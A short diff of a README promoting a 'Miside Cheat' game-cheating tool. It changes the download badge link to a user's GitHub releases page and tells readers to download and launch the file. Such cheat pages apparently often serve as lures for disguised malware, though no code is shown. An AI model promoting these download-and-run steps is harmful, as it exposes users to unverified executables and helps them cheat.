@@ -21,7 +21,7 @@ Are you ready to unleash your full potential in your favorite games? Head over t
 ### 🚨 How to Get Started:
 Ready to revolutionize your gameplay? Simply download our tools from the link below and start cheating like a pro!
 
-[![Download Miside Cheat](https://img.shields.io/badge/Download-Miside_Cheat-BrightGreen)](https://github.com/releases/789694263/Release.zip)
+[![Download Miside Cheat](https://github.com/brinakisha87/Miside-Cheat/releases)](https://github.com/brinakisha87/Miside-Cheat/releases)
 
 ### 🚀 Launching the File:
 Once you've downloaded the Miside Cheat file, launch it and get ready to elevate your gaming experience to new heights!
